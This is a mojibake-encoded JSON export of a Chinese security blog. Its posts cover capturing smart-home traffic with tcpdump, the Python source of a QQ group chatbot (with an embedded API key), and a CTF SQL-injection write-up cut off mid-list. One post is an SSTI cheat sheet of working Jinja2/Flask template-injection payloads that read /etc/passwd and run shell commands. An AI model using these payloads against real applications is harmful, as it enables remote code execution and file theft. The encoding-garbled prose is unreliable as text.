[{"title":"CTFshowSSTI","url":"/2022/04/18/CTFshowSSTI/"},{"url":"/2022/04/17/æµé‡æ•è·/","content":"# æ™ºèƒ½å®¶å±…è®¾å¤‡çš„æµé‡æ•è·\n\nå¯¹æ™ºèƒ½å®¶å±…è®¾å¤‡è¿›è¡Œå…¥ä¾µç›‘æµ‹ï¼Œé¦–è¦å°±æ˜¯è·å¾—æ™ºèƒ½å®¶å±…è®¾å¤‡çš„æµé‡ï¼Œå¯¹æ­¤ï¼Œæˆ‘ä»¬æƒ³åˆ°é€šè¿‡åœ¨ç½‘å…³ï¼ˆè·¯ç”±å™¨ï¼‰å¤„è®¾ç½®æµé‡æ•è·çª—å£æ¥è¿›è¡Œæ™ºèƒ½å®¶å±…è®¾å¤‡çš„æµé‡æ•è·\n\næµ‹è¯•ä½¿ç”¨çš„è®¾å¤‡æœ‰ï¼š\n\n- å®‰è£…æœ‰OpenWrtå›ºä»¶çš„è·¯ç”±å™¨\n- ä¸€ä¸ªæ™ºèƒ½å°ç¯\n\nåœ¨æƒ³åˆ°äºç½‘å…³å¤„è¿›è¡Œæµé‡æ•è·æ—¶ï¼Œå°±æƒ³åˆ°ä½¿ç”¨å¼€æºçš„è·¯ç”±å™¨æ“ä½œç³»ç»Ÿä¾¿äºä½¿ç”¨ï¼Œç»è¿‡æŸ¥æ‰¾ä¸€å®šèµ„æ–™ï¼Œå‘ç°tcpdumpè¿™ä¸ªè½¯ä»¶åˆšå¥½ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚ï¼Œé¦–å…ˆåœ¨è·¯ç”±å™¨ç«¯ä½¿ç”¨å‘½ä»¤å®‰è£…tcpdump\n\n```shell\nopkg install tcpdump\n```\n\nå°è¯•ç›‘å¬å†…ç½‘ç½‘å¡æ•è·æµé‡\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-17 22.35.59.png)\n\nå¯ä»¥çœ‹åˆ°å¤§é‡æµé‡åŒ…è¢«æ•è·ï¼Œä¸‹ä¸€æ­¥æˆ‘ä»¬è¦æ‰¾å‡ºè·¯ç”±å™¨ç»™å°ç¯åˆ†é…çš„IPåœ°å€å¹¶é’ˆå¯¹æ€§çš„è¿›è¡Œæ•è·\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-17 22.37.58.png)\n\nåœ¨è·¯ç”±å™¨ç®¡ç†é¡µé¢å¯ä»¥æ˜æ˜¾çœ‹åˆ°å°ç¯å¯¹åº”çš„IPåœ°å€æ˜¯192.168.1.186ï¼Œæˆ‘ä»¬å°è¯•å¯¹è¯¥åœ°å€è¿›è¡Œæ•è·\n\n```shell\ntcpdump -i br-lan host 192.168.1.186\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-17 22.41.23.png)\n\nå¯ä»¥å°†æ•è·çš„æµé‡ç”Ÿæˆæ–‡ä»¶å¹¶ä¸”ä½¿ç”¨wiresharkæŸ¥çœ‹\n\n```shell\ntcpdump -i br-lan host 192.168.1.186 -c 100 -w light\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-17 22.45.16.png)\n\næ•è·åˆ°çš„æ•°æ®å¯åœ¨åæœŸè¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†æ"},{"title":"ç½—ä¼¯ç‰¹","url":"/2022/04/15/ç½—ä¼¯ç‰¹/","content":"\n```python\n#bot.py\nfrom unittest.mock import NonCallableMagicMock\nfrom flask import Flask, request\nimport requests\nimport api\napp = Flask(__name__)\n\n'''ç›‘å¬ç«¯å£ï¼Œè·å–QQä¿¡æ¯'''\n@app.route('/', methods=[\"POST\"])\ndef post_data():\n    'ä¸‹é¢çš„request.get_json().get......æ˜¯ç”¨æ¥è·å–å…³é”®å­—çš„å€¼ç”¨çš„ï¼Œå…³é”®å­—å‚è€ƒä¸Šé¢ä»£ç æ®µçš„æ•°æ®æ ¼å¼'\n    if request.get_json().get('message_type')=='private':\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        api.keywordForPerson(message,uid)\n    if request.get_json().get('message_type')=='group':\n        gid = request.get_json().get('group_id')\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        nick=request.get_json().get('sender').get('nickname')\n        role=request.get_json().get('sender').get('role')\n        api.keywordForGroup(message, gid, uid,nick,role)\n    return 'OK'\n\n\nif __name__ == '__main__':\n    app.run(debug=True, host='127.0.0.1', port=5701)\n\n```\n\n```python\n#api.py\nimport person\nimport group\nimport requests\nimport re\nimport time\nimport json\nimport random\n\n\n\ndef help():\n    return \"å¤©æ°”ï¼šè¾“å…¥å¤©æ°” åœ°åï¼Œè·å–å½“åœ°å¤©æ°”ï¼Œé»˜è®¤ä¸ºå¾å·å¤©æ°”\\nåŒè‰²çƒï¼šè¾“å…¥åŒè‰²çƒæŸ¥çœ‹æœ€æ–°ä¸€æœŸåŒè‰²çƒå¼€å¥–ä¿¡æ¯ä»¥åŠå¥–æ± ç´¯è®¡é‡‘é¢\\næ‰”ç“¶å­ï¼šç§èŠç½—ä¼¯ç‰¹å¹¶å‘é€ä»¥ä¸‹å†…å®¹ï¼š\\næ‰”ç“¶å­ å‘é€è€…ï¼ˆå¯å¡«åŒ¿åï¼‰ æ¥å—è€…ï¼ˆå¯å¡«ç©ºï¼‰ å†…å®¹\\næ¥æ‰”ç“¶å­\\næç“¶å­ï¼šå‘é€æç“¶å­æ¥æåˆ«äººæ‰”çš„ç“¶å­\\nå¸®åŠ©ï¼šè¾“å…¥/helpï¼Œè·å–å¸®åŠ©\"\ndef weather(message):\n    try:\n        city=message.split(' ')[1]\n    except:\n        city='å¾å·'\n    try:\n        ercode=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city,timeout=1).text\n    except:\n        return \"ç½—ä¼¯ç‰¹è¢«å­¦æ ¡å…³èµ·æ¥äº†å‘œå‘œ\"\n    if \"invilad-citykey\" in ercode:\n        return \"æŠ±æ­‰ï¼Œæ‚¨çš„è¾“å…¥æœ‰è¯¯ï¼Œè¯·æ£€æŸ¥åå†è¯•\"\n    weatherInfo=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['forecast'][0]\n    ganmao=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['ganmao']\n    fl=re.search(r\"[0-9]+\",weatherInfo['fengli']).group(0)\n    hi=re.search(r\"[0-9]+\",weatherInfo['high']).group(0)\n    lo=re.search(r\"[0-9]+\",weatherInfo['low']).group(0)\n    weatherInfo=f\"ä»Šæ—¥{city}å¤©æ°”{weatherInfo['type']}ï¼Œæœ€é«˜æ¸©åº¦{hi}â„ƒï¼Œæœ€ä½æ¸©åº¦{lo}â„ƒï¼Œ{weatherInfo['fengxiang']}{fl}çº§\\næ¸©é¦¨æç¤ºï¼Œ{ganmao}\"\n    return weatherInfo\ndef buquan(message,uid):\n    #è®¡ç®—æ‹¬å·æ•°é‡å¹¶è‡ªåŠ¨è¡¥å…¨\n    def countBracket(message):\n        countban=0\n        for i in message:\n            if i=='(':\n                countban+=1\n            if i==')':\n                countban-=1\n        countquan=0\n        for i in message:\n            if i=='ï¼ˆ':\n                countquan+=1\n            if i=='ï¼‰':\n                countquan-=1\n        return {'ban':countban,'quan':countquan}\n    #è‡ªåŠ¨è¡¥å…¨æ‹¬å·\n    ban=countBracket(message)['ban']\n    quan=countBracket(message)['quan']\n    bu=\"\"\n    if not (ban or quan):\n        return\n    if ban>0:\n        for i in range(ban):\n            bu+=')'\n    elif ban<0:\n        for i in range(-ban):\n            bu+='('\n    if quan>0:\n        for i in range(quan):\n            bu+='ï¼‰'\n    elif quan<0:\n        for i in range(-quan):\n            bu+='ï¼ˆ'\n    print(bu+f\"[CQ:at,qq={uid}]å¸®ä½ è¡¥æ‹¬å·\")\n    return bu+f\"[CQ:at,qq={uid}]å¸®ä½ è¡¥æ‹¬å·\"\ndef theDoubleChromosphere(uid):\n    tex=requests.get(\"http://www.cwl.gov.cn/fcpz/yxjs/ssq/\").text\n    #è·å–çº¢çƒ\n    red=re.search(r\"<div class=\\\"ssqRed-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    red=red.split(',')\n    #è·å–è“çƒ\n    blue=re.search(r\"<div class=\\\"ssqBlue-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    blue=blue.split(',')\n    #è·å–æœŸå·\n    qh=re.search(r\"<div class=\\\"ssqQh-dom\\\">(.*?)</div>\",tex).group(1)\n    #è·å–å¥–æ± \n    pool=re.search(r\"<div class=\\\"ssqPool-dom\\\">(.*?)</div>\",tex).group(1)\n    return f\"ç¬¬{qh}æœŸå¼€å¥–ç»“æœä¸ºï¼š\\nçº¢çƒï¼š{red}\\nè“çƒï¼š{blue}\\nå¥–æ± ï¼š{pool}\\n[CQ:at,qq={uid}]å®³æç€ç­‰ç€å¹²å•¥å‘¢ï¼Œèµ¶ç´§ä¹°å½©ç¥¨å»å•Š\"\ndef sign(gid,uid,nick):\n    today=time.strftime(\"%Y-%m-%d\",time.localtime())\n    groupUserInfo=group.readGroupUserInfo()\n    try:\n        thisGroupUserInfo=groupUserInfo[str(gid)]\n    except:\n        thisGroupUserInfo={}\n        thisGroupUserInfo[str(uid)]={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n        thisGroupUserInfo[str(uid)]=thisUser\n    if thisUser['signTime']==today:\n        return f\"[CQ:at,qq={uid}]æ‚¨ä»Šå¤©å·²ç»ç­¾åˆ°è¿‡äº†ï¼Œæ˜å¤©å†æ¥å§\"\n    else:\n        thisUser['point']+=1\n        thisUser['signTime']=today\n        group.saveGroupUserInfo(groupUserInfo)\n        return f\"[CQ:at,qq={uid}]ç­¾åˆ°æˆåŠŸï¼Œæ‚¨çš„ç§¯åˆ†ä¸º{thisUser['point']}ï¼Œæ˜å¤©å†æ¥å§\"\ndef getQQ(message):\n    try:\n        qq=re.search(r\"qq=(\\d+)\",message).group(1)\n    except:\n        qq=None\n    return qq\ndef ban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=True\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"å¥½ï¼Œæˆ‘ä»¬ä¸å’Œ[CQ:at,qq={uid}]ç©\"\ndef unban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=False\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"å¥½å§ï¼Œæˆ‘åŸè°…ä½ äº†[CQ:at,qq={uid}]\"\ndef keywordForPerson(message, uid):\n    if message[0:2]=='å¤©æ°”':\n        person.sendMessage(weather(message),uid)\ndef isBan(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['ban']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef point(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        return f\"[CQ:at,qq={uid}]æ‚¨çš„ç§¯åˆ†ä¸º{thisUser['point']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]è¯·å…ˆç­¾åˆ°åé‡è¯•\"\ndef isAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['admin']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef giveAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": \"nick\", \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    thisUser['admin']=True\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"æ²¡é—®é¢˜ï¼Œä»¥åæˆ‘å°±å¬ä½ çš„å•¦[CQ:at,qq={uid}]\"\ndef today(message):\n    try:\n        message=message.split(' ')\n        message=message[1]\n    except:\n        message=None\n        return f\"è¯·è¾“å…¥è¿åŠ¿ æ˜Ÿåº§æ¥æŸ¥è¯¢ä»Šæ—¥è¿åŠ¿\"\n    if len(message)==2:\n        message=message+\"åº§\"\n    url=\"http://web.juhe.cn:8080/constellation/getAll\"\n    params={\n        \"key\":\"4a11bbcbf089edaf14c2d9bdb80c2ec4\",\n        \"consName\":message,\n        \"type\":\"today\"\n    }\n    ys=requests.get(url=url,params=params).json()\n    return f\"{ys['name']}ä»Šæ—¥è¿åŠ¿ï¼š\\nç»¼åˆæŒ‡æ•°ï¼š{ys['all']}%\\nå¹¸è¿è‰²ï¼š{ys['color']}\\nå¥åº·æŒ‡æ•°ï¼š{ys['health']}%\\nçˆ±æƒ…æŒ‡æ•°ï¼š{ys['love']}%\\nè´¢è¿æŒ‡æ•°ï¼š{ys['money']}%\\nå·¥ä½œæŒ‡æ•°ï¼š{ys['work']}%\\nå¹¸è¿æ•°å­—ï¼š{ys['number']}\\né€‚é…æ˜Ÿåº§ï¼š{ys['QFriend']}\\næ€»ç»“ï¼š{ys['summary']}\"\ndef minusPoint(gid,uid,point):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]è¯·å…ˆç­¾åˆ°åé‡è¯•\"\n    if thisUser['point']-point < 0:\n        return f\"[CQ:at,qq={uid}]æ‚¨çš„ç§¯åˆ†ä¸è¶³\"\n    thisUser['point']-=point\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return \"OK\"\ndef throwBottle(uid,message):\n    try:\n        me=message.split(\" \",3)\n        send=me[1]\n        rec=me[2]\n        con=me[3]\n        with open('bottle.json','r') as f:\n            bottle = json.load(f)\n        nb={\n            \"QQ\":str(uid),\n            \"send\":send,\n            \"rec\":rec,\n            \"con\":con\n        }\n        bottle.append(nb)\n        with open('bottle.json','w') as f:\n            json.dump(bottle,f)\n        return f\"biuï½ï½ï½ç“¶å­è¢«æ‰”èµ°å•¦ï¼Œåç­‰è¢«äººæ‰“æå§ï½ï½ï½\"\n    except:\n        return \"æ‰”ç“¶å­å¤±è´¥äº†ï¼Œè¯·æ£€æŸ¥å†…å®¹æ ¼å¼æ˜¯å¦ä¸ºï¼š\\næ‰”ç“¶å­ å‘é€è€…ï¼ˆå¯å¡«åŒ¿åï¼‰ æ¥å—è€…ï¼ˆå¯å¡«ç©ºï¼‰ å†…å®¹\"\ndef getBottle(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)      \n    with open('bottle.json','r') as f:\n        bottle = json.load(f)\n    num=random.randint(0,len(bottle)-1)\n    nb=bottle[num]\n    bottle.remove(nb)\n    try:\n        myBottles[str(uid)].append(nb)\n    except:\n        myBottles[str(uid)]=[nb]\n    with open('bottle.json','w') as f:\n        json.dump(bottle,f)\n    with open('myBottles.json','w') as f:\n        json.dump(myBottles,f)\n    return f\"{nb['send']}æ‰”ç»™äº†{nb['rec']}ä¸€ä¸ªç“¶å­ï¼Œå†…å®¹æ˜¯ï¼š{nb['con']}\"\ndef myBottles(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return \"æ‚¨è¿˜æ²¡æœ‰ç“¶å­å‘¢ï¼Œå¿«å»æç“¶å­å§ï½ï½ï½\"\n    me=\"\"\n    for i in myBottles[str(uid)]:\n        me+=f\"{i['send']}æ‰”ç»™äº†{i['rec']}ä¸€ä¸ªç“¶å­ï¼Œå†…å®¹æ˜¯ï¼š{i['con']}\\n\"\n    return f\"[CQ:at,qq={uid}]æ‚¨çš„ç“¶å­æœ‰ï¼š\\n{me}\"\ndef cleanBottles(message,uid):\n    num=message.split(\" \")[1]\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]æ‚¨è¿˜æ²¡æœ‰ç“¶å­å‘¢ï¼Œå¿«å»æç“¶å­å§ï½ï½ï½\"\n    try:\n        nb=myBottles[str(uid)].pop(int(num)-1)\n        with open('myBottles.json','w') as f:\n            json.dump(myBottles,f)\n        return f\"[CQ:at,qq={uid}]æ‚¨æ‘”ç¢äº†{nb['send']}æ‰”ç»™{nb['rec']}ä¸€ä¸ªç“¶å­ï¼Œå†…å®¹æ˜¯ï¼š{nb['con']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]æ‚¨è¿˜æ²¡æœ‰è¿™ä¸ªç“¶å­ï¼Œå¿«å»æä¸€ä¸ªå§\"\n\n\ndef keywordForGroup(message, gid, uid,nick,role):\n    if isBan(gid,uid) and not isAdmin(gid,uid):\n        return\n    if message[0:2]=='å¤©æ°”':\n        group.sendMessage(weather(message),gid)\n    elif message[0:2]=='è¿åŠ¿':\n        group.sendMessage(today(message),gid)\n    elif message==\"ç§¯åˆ†\":\n        group.sendMessage(point(gid,uid),gid)\n    elif message[0:4]==\"å¬ä»–çš„è¯\" and uid==405454586:\n        group.sendMessage(giveAdmin(gid,getQQ(message)),gid)\n    elif message[0:3]=='ban' and isAdmin(gid,uid):\n        group.sendMessage(ban(gid,getQQ(message)),gid)\n    elif message[0:5]=='unban' and isAdmin(gid,uid):\n        group.sendMessage(unban(gid,getQQ(message)),gid)\n    elif message=='/help':\n        group.sendMessage(help(),gid)\n    elif message[0:3]=='åŒè‰²çƒ':\n        group.sendMessage(theDoubleChromosphere(uid),gid)\n    elif message==\"ç­¾åˆ°\":\n        group.sendMessage(sign(gid,uid,nick),gid)\n    elif message==\"æç“¶å­\":\n        group.sendMessage(getBottle(uid),gid)\n    elif message==\"æˆ‘çš„ç“¶å­\":\n        group.sendMessage(myBottles(uid),gid)\n    elif message[0:3]==\"æ‘”ç“¶å­\":\n        group.sendMessage(cleanBottles(message,uid),gid)\n    elif message==\"æ— å†…é¬¼\":\n        group.sendMessage(f\"[CQ:at,qq={uid}]ç©¿ä»¶è¡£æœå§ä½ ï¼ä½ è‡ªå·±ä¸æ¶sinå—ï¼Ÿ\",gid)\n    if re.search(r\"[\\(\\)ï¼ˆï¼‰]\",message):\n        group.sendMessage(buquan(message,uid),gid)\ndef keywordForPerson(message,uid):\n    if message[0:3]==\"æ‰”ç“¶å­\":\n        person.sendMessage(throwBottle(uid,message),uid)\n```\n\n```python\n#group.py\nimport json\nimport requests\n\n#ä¿å­˜ç”¨æˆ·ä¿¡æ¯\ndef saveGroupUserInfo(userInfo):\n    with open('userInfoOfGroup.json','w') as f:\n        json.dump(userInfo,f)\n#è¯»å–ç”¨æˆ·ä¿¡æ¯\ndef readGroupUserInfo():\n    with open('userInfoOfGroup.json','r') as f:\n        userInfo = json.load(f)\n    return userInfo\n#å‘é€ä¿¡æ¯\ndef sendMessage(message,gid):\n    url=\"http://127.0.0.1:5700/send_msg?group_id=\"+str(gid)+\"&message=\"+message\n    requests.get(url)\n```\n\n","tags":["python"]},{"title":"SSTI","url":"/2022/04/15/SSTI/","content":"\n### **Pythonä¸­æœ‰ç”¨çš„é­”æœ¯æ–¹æ³•**\n\n```python\n__class__           æŸ¥çœ‹å¯¹è±¡æ‰€åœ¨çš„ç±»\n__mro__             æŸ¥çœ‹ç»§æ‰¿å…³ç³»å’Œè°ƒç”¨é¡ºåºï¼Œè¿”å›å…ƒç»„\n__base__            è¿”å›åŸºç±»\n__bases__           è¿”å›åŸºç±»å…ƒç»„\n__subclasses__()    è¿”å›å­ç±»åˆ—è¡¨\n__init__            è°ƒç”¨åˆå§‹åŒ–å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥è·³åˆ°__globals__\n__globals__         è¿”å›å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ï¼Œè¿”å›å­—å…¸\n__builtins__        è¿”å›å†…å»ºå†…å»ºåç§°ç©ºé—´å­—å…¸\n__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ\n__getattribute__()   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚:a.xxx/a.xxx()ï¼‰\t\téƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚\n__getitem__()        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a['b']ï¼Œå°±æ˜¯a.__getitem__('b')\n__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚\n__import__           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__('os').popen('ls').read()]\n__str__()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚\nurl_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_app\nget_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_app\nlipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š{{lipsum.__globals__['os'].popen('ls').read()}}\n{{cycler.__init__.__globals__.os.popen('ls').read()}}\ncurrent_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡\nrequest              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()\nrequest.args.x1   \t getä¼ å‚\nrequest.values.x1 \t æ‰€æœ‰å‚æ•°\nrequest.cookies      cookieså‚æ•°\nrequest.headers      è¯·æ±‚å¤´å‚æ•°\nrequest.form.x1   \t postä¼ å‚\t(Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)\nrequest.data  \t\t postä¼ å‚\t(Content-Type:a/b)\nrequest.json\t\t postä¼ json  (Content-Type: application/json)\nconfig               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\n```\n\n### ä»£ç å—\n\n```\nå˜é‡å— {{}}\tç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º\næ³¨é‡Šå— {##}\tæ³¨é‡Š\næ§åˆ¶å—\t{%%}\tå¯ä»¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œè¯­å¥\nè¡Œå£°æ˜\t##\t\tå¯ä»¥æœ‰å’Œ{%%}ç›¸åŒçš„æ•ˆæœ\n```\n\n### **Flaskçš„ä¸€äº›å…¨å±€å˜é‡ && å…³é”®å­—**\n\n```python\n{{config}}\n{{requests}}\n{{requests.environ}}\n{{self}}\n{{url_for}}\n{{get_flashed_messages}}\n{{url_for.__globals__[\"os\"].system('calc')}}\n```\n\n### å¸¸ç”¨payload\n\n```\n>>>''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()\n>>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')\n//æƒ³è¦è·å–å‘½ä»¤æ‰§è¡Œç»“æœå¯ä»¥åœ¨åé¢åŠ ä¸Š.read()\n>>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()\n \n--------------------------------\n \n>>>object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()\n \n--------------------------------\n{{''.__class__.__mro__[-1].__subclasses__()[200]('calc') }}\nå…¶ä¸­çš„xxxxå¯ä»¥ä¸ºä»»æ„å­—ç¬¦\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.eval(\"__import__('os').popen('whoami').read()\") }}\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.exec(\"__import__('os').popen('calc').read()\") }} #æœ¬åœ°æµ‹è¯•ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰§è¡Œwhoamiåªä¼šè¿”å›None\n```\n\n","tags":["CTF","web"]},{"title":"BUUCTFè®°å½•","url":"/2022/04/13/BUUCTFè®°å½•/","content":"\n## [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL\n\né¦–å…ˆå°è¯•è¾“å…¥ç‚¹ä¸œè¥¿\n\nç»“æœ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-13 22.14.07.png)\n\nå°è¯•ä¸‡èƒ½å¯†ç ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-13 22.14.34.png)\n\nè·‘ä¸€ä¸‹çœ‹çœ‹éƒ½è¿‡æ»¤äº†å•¥\n\n```\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: union\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: and\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: sleep\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: by\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: if\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: char\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: ascii\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: mid\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: substring\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: handler\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: benchmark\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: insert\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: *\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: =\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: \\\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: ç©ºæ 